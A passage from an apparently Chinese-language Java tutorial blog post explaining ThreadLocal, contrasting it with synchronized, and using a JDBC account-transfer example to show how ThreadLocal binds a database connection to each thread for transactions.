class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    demo.setContent(Thread.currentThread().getName() + <span class="string">"的数据"</span>);</span><br><span class="line">                    System.out.println(<span class="string">"-----------------------"</span>);</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">"---&gt;"</span> + demo.getContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            thread.setName(<span class="string">"线程"</span> + i);</span><br><span class="line">            thread.start();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615095649.png" alt="image-20210614232043611"></p><p> 从结果可以看出多个线程在访问同一个变量的时候出现的异常，线程间的数据没有隔离。下面我们来看下采用 ThreadLocal 的方式来解决这个问题的例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDemo1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ThreadLocal&lt;String&gt; tl = <span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tl.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">         tl.set(content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyDemo demo = <span class="keyword">new</span> MyDemo();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    demo.setContent(Thread.currentThread().getName() + <span class="string">"的数据"</span>);</span><br><span class="line">                    System.out.println(<span class="string">"-----------------------"</span>);</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">"---&gt;"</span> + demo.getContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            thread.setName(<span class="string">"线程"</span> + i);</span><br><span class="line">            thread.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614231835.png" alt="image-20210614231825341"></p><p>从结果来看，这样很好的解决了多线程之间数据隔离的问题，十分方便。</p><h2 id="ThreadLocal类与synchronized关键字"><a href="#ThreadLocal类与synchronized关键字" class="headerlink" title="ThreadLocal类与synchronized关键字"></a>ThreadLocal类与synchronized关键字</h2><h3 id="synchronized同步方式"><a href="#synchronized同步方式" class="headerlink" title="synchronized同步方式"></a>synchronized同步方式</h3><p>这里可能有的朋友会觉得在上述例子中我们完全可以通过加锁来实现这个功能。我们首先来看一下用synchronized代码块实现的效果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;   </span><br><span class="line"><span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo02 demo02 = <span class="keyword">new</span> Demo02();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            Thread t = <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">synchronized</span> (Demo02<span class="class">.<span class="keyword">class</span>)</span>&#123;</span><br><span class="line">                        demo02.setContent(Thread.currentThread().getName() + <span class="string">"的数据"</span>);</span><br><span class="line">                        System.out.println(<span class="string">"-------------------------------------"</span>);</span><br><span class="line">                        String content = demo02.getContent();</span><br><span class="line">                        System.out.println(Thread.currentThread().getName() + <span class="string">"---&gt;"</span> + content);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            t.setName(<span class="string">"线程"</span> + i);</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果： </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614232842.png" alt="image-20210614232839654"></p><p>从结果可以发现, 加锁确实可以解决这个问题，但是在这里我们强调的是线程数据隔离的问题，并不是多线程共享数据的问题, 在这个案例中使用synchronized关键字是不合适的。</p><h3 id="ThreadLocal与synchronized的区别"><a href="#ThreadLocal与synchronized的区别" class="headerlink" title="ThreadLocal与synchronized的区别"></a>ThreadLocal与synchronized的区别</h3><p> 虽然ThreadLocal模式与synchronized关键字都用于处理多线程并发访问变量的问题, 不过两者处理问题的角度和思路不同。</p><table><thead><tr><th></th><th><strong>synchronized</strong></th><th><strong>ThreadLocal</strong></th></tr></thead><tbody><tr><td>原理</td><td>同步机制采用’以时间换空间’的方式, 只提供了一份变量,让不同的线程排队访问</td><td>ThreadLocal采用’以空间换时间’的方式, 为每一个线程都提供了一份变量的副本,从而实现同时访问而相不干扰</td></tr><tr><td>侧重点</td><td>多个线程之间访问资源的同步</td><td>多线程中让每个线程之间的数据相互隔离</td></tr></tbody></table><blockquote><p>总结：<br>在刚刚的案例中，虽然使用ThreadLocal和synchronized都能解决问题,但是使用ThreadLocal更为合适,因为这样可以使程序拥有更高的并发性。</p></blockquote><h1 id="运用场景-事务案例"><a href="#运用场景-事务案例" class="headerlink" title="运用场景_事务案例"></a>运用场景_事务案例</h1><p>通过以上的介绍，我们已经基本了解ThreadLocal的特点。但是它具体是运用在什么场景中呢？ 接下来让我们看一个案例： 事务操作。</p><h2 id="转账案例"><a href="#转账案例" class="headerlink" title="转账案例"></a>转账案例</h2><h3 id="场景构建"><a href="#场景构建" class="headerlink" title="场景构建"></a>场景构建</h3><p> 这里我们先构建一个简单的转账场景： 有一个数据表account，里面有两个用户Jack和Rose，用户Jack 给用户Rose 转账。</p><p>案例的实现主要用mysql数据库，JDBC 和 C3P0 框架。以下是详细代码 ：</p><ol><li><p>项目结构</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614233207.png" alt="image-20210614233204646"></p></li><li><p>数据准备</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210614233238.png" alt="image-20210614233235895"></p></li><li><p>dao层代码 ： AccountDao</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">out</span><span class="params">(String outUser, <span class="keyword">int</span> money)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        String sql = <span class="string">"update account set money = money - ? where name = ?"</span>;</span><br><span class="line"></span><br><span class="line">        Connection conn = JdbcUtils.getConnection();</span><br><span class="line">        PreparedStatement pstm = conn.prepareStatement(sql);</span><br><span class="line">        pstm.setInt(<span class="number">1</span>,money);</span><br><span class="line">        pstm.setString(<span class="number">2</span>,outUser);</span><br><span class="line">        pstm.executeUpdate();</span><br><span class="line"></span><br><span class="line">        JdbcUtils.release(pstm,conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">in</span><span class="params">(String inUser, <span class="keyword">int</span> money)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        String sql = <span class="string">"update account set money = money + ? where name = ?"</span>;</span><br><span class="line"></span><br><span class="line">        Connection conn = JdbcUtils.getConnection();</span><br><span class="line">        PreparedStatement pstm = conn.prepareStatement(sql);</span><br><span class="line">        pstm.setInt(<span class="number">1</span>,money);</span><br><span class="line">        pstm.setString(<span class="number">2</span>,inUser);</span><br><span class="line">        pstm.executeUpdate();</span><br><span class="line"></span><br><span class="line">        JdbcUtils.release(pstm,conn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>service层代码 ： AccountService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">transfer</span><span class="params">(String outUser, String inUser, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        AccountDao ad = <span class="keyword">new</span> AccountDao();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 转出</span></span><br><span class="line">            ad.out(outUser, money);</span><br><span class="line">            <span class="comment">// 转入</span></span><br><span class="line">            ad.in(inUser, money);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>工具类 ： JdbcUtils</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcUtils</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">commitAndClose</span><span class="params">(Connection conn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//提交事务</span></span><br><span class="line">                conn.commit();</span><br><span class="line">                <span class="comment">//释放连接</span></span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rollbackAndClose</span><span class="params">(Connection conn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//回滚事务</span></span><br><span class="line">                conn.rollback();</span><br><span class="line">                <span class="comment">//释放连接</span></span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="引入事务"><a href="#引入事务" class="headerlink" title="引入事务"></a>引入事务</h3><p>案例中的转账涉及两个DML(A data manipulation language)操作： 一个转出，一个转入。这些操作是需要具备原子性的，不可分割。不然就有可能出现数据修改异常情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">transfer</span><span class="params">(String outUser, String inUser, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        AccountDao ad = <span class="keyword">new</span> AccountDao();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 转出</span></span><br><span class="line">            ad.out(outUser, money);</span><br><span class="line">            <span class="comment">// 模拟转账过程中的异常</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 转入</span></span><br><span class="line">            ad.in(inUser, money);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这里就需要操作事务，来保证转出和转入操作具备原子性，要么同时成功，要么同时失败。</p><p><strong>JDBC中关于事务的操作的api</strong></p><table><thead><tr><th>Connection接口的方法</th><th>作用</th></tr></thead><tbody><tr><td>void setAutoCommit(false)</td><td>禁用事务自动提交（改为手动）</td></tr><tr><td>void commit();</td><td>提交事务</td></tr><tr><td>void rollback();</td><td>回滚事务</td></tr></tbody></table><p><strong>开启事务的注意点</strong></p><ul><li>为了保证所有的操作在一个事务中,案例中使用的连接必须是同一个: service层开启事务的connection需要跟dao层访问数据库的connection保持一致</li></ul><ul><li>线程并发情况下, 每个线程只能操作各自的 connection</li></ul><h2 id="常规解决方案"><a href="#常规解决方案" class="headerlink" title="常规解决方案"></a>常规解决方案</h2><h3 id="常规方案的实现"><a href="#常规方案的实现" class="headerlink" title="常规方案的实现"></a>常规方案的实现</h3><p>基于上面给出的前提， 大家通常想到的解决方案是 ：</p><ul><li>传参: 从service层将connection对象向dao层传递</li><li>加锁</li></ul><p>以下是代码实现修改的部分：</p><p>AccountService 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">transfer</span><span class="params">(String outUser, String inUser, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">            AccountDao ad = <span class="keyword">new</span> AccountDao();</span><br><span class="line">            <span class="comment">//线程并发情况下,为了保证每个线程使用各自的connection,故加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (AccountService<span class="class">.<span class="keyword">class</span>) </span>&#123;     </span><br><span class="line">                Connection conn = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conn = JdbcUtils.getConnection();</span><br><span class="line">                    <span class="comment">//开启事务</span></span><br><span class="line">                    conn.setAutoCommit(<span class="keyword">false</span>);</span><br><span class="line">                    <span class="comment">// 转出</span></span><br><span class="line">                    ad.out(conn, outUser, money);</span><br><span class="line">                    <span class="comment">// 模拟转账过程中的异常</span></span><br><span class="line">                    <span class="comment">// int i = 1/0;</span></span><br><span class="line">                    <span class="comment">// 转入</span></span><br><span class="line">                    ad.in(conn, inUser, money);</span><br><span class="line">                    <span class="comment">//事务提交</span></span><br><span class="line">                    JdbcUtils.commitAndClose(conn);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="comment">//事务回滚</span></span><br><span class="line">                    JdbcUtils.rollbackAndClose(conn);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AccountDao 类 （这里需要注意的是： connection不能在dao层释放，要在service层，不然在dao层释放，service层就无法使用了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">out</span><span class="params">(Connection conn, String outUser, <span class="keyword">int</span> money)</span> <span class="keyword">throws</span> SQLException</span>&#123;</span><br><span class="line">        String sql = <span class="string">"update account set money = money - ? where name = ?"</span>;</span><br><span class="line">        <span class="comment">//注释从连接池获取连接的代码,使用从service中传递过来的connection</span></span><br><span class="line"><span class="comment">//      Connection conn = JdbcUtils.getConnection();</span></span><br><span class="line">        PreparedStatement pstm = conn.prepareStatement(sql);</span><br><span class="line">        pstm.setInt(<span class="number">1</span>,money);</span><br><span class="line">        pstm.setString(<span class="number">2</span>,outUser);</span><br><span class="line">        pstm.executeUpdate();</span><br><span class="line">        <span class="comment">//连接不能在这里释放,service层中还需要使用</span></span><br><span class="line"><span class="comment">//      JdbcUtils.release(pstm,conn);</span></span><br><span class="line">        JdbcUtils.release(pstm);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">in</span><span class="params">(Connection conn, String inUser, <span class="keyword">int</span> money)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    String sql = <span class="string">"update account set money = money + ? where name = ?"</span>;</span><br><span class="line"><span class="comment">//      Connection conn = JdbcUtils.getConnection();</span></span><br><span class="line">        PreparedStatement pstm = conn.prepareStatement(sql);</span><br><span class="line">        pstm.setInt(<span class="number">1</span>,money);</span><br><span class="line">        pstm.setString(<span class="number">2</span>,inUser);</span><br><span class="line">        pstm.executeUpdate();</span><br><span class="line"><span class="comment">//      JdbcUtils.release(pstm,conn);</span></span><br><span class="line">        JdbcUtils.release(pstm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常规方案的弊端"><a href="#常规方案的弊端" class="headerlink" title="常规方案的弊端"></a>常规方案的弊端</h3><p>上述方式我们看到的确按要求解决了问题，但是仔细观察，会发现这样实现的弊端：</p><ol><li>直接从service层传递connection到dao层, 造成代码耦合度提高</li><li>加锁会造成线程失去并发性，程序性能降低</li></ol><h2 id="ThreadLocal解决方案"><a href="#ThreadLocal解决方案" class="headerlink" title="ThreadLocal解决方案"></a>ThreadLocal解决方案</h2><h3 id="ThreadLocal方案的实现"><a href="#ThreadLocal方案的实现" class="headerlink" title="ThreadLocal方案的实现"></a>ThreadLocal方案的实现</h3><p>像这种需要在项目中进行数据传递和线程隔离的场景，我们不妨用ThreadLocal来解决：</p><p>工具类的修改： 加入ThreadLocal</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">//ThreadLocal对象 : 将connection绑定在当前线程中</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;Connection&gt; tl = <span class="keyword">new</span> ThreadLocal();</span><br><span class="line">    <span class="comment">// c3p0 数据库连接池对象属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ComboPooledDataSource ds = <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取连接</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="comment">//取出当前线程绑定的connection对象</span></span><br><span class="line">        Connection conn = tl.get();</span><br><span class="line">        <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//如果没有，则从连接池中取出</span></span><br><span class="line">            conn = ds.getConnection();</span><br><span class="line">            <span class="comment">//再将connection对象绑定到当前线程中</span></span><br><span class="line">            tl.set(conn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">release</span><span class="params">(AutoCloseable... ios)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (AutoCloseable io : ios) &#123;</span><br><span class="line">            <span class="keyword">if</span> (io != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    io.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">commitAndClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Connection conn = getConnection();</span><br><span class="line">            <span class="comment">//提交事务</span></span><br><span class="line">            conn.commit();</span><br><span class="line">            <span class="comment">//解除绑定</span></span><br><span class="line">            tl.remove();</span><br><span class="line">            <span class="comment">//释放连接</span></span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rollbackAndClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Connection conn = getConnection();</span><br><span class="line">            <span class="comment">//回滚事务</span></span><br><span class="line">            conn.rollback();</span><br><span class="line">            <span class="comment">//解除绑定</span></span><br><span class="line">            tl.remove();</span><br><span class="line">            <span class="comment">//释放连接</span></span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AccountService类的修改：不需要传递connection对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 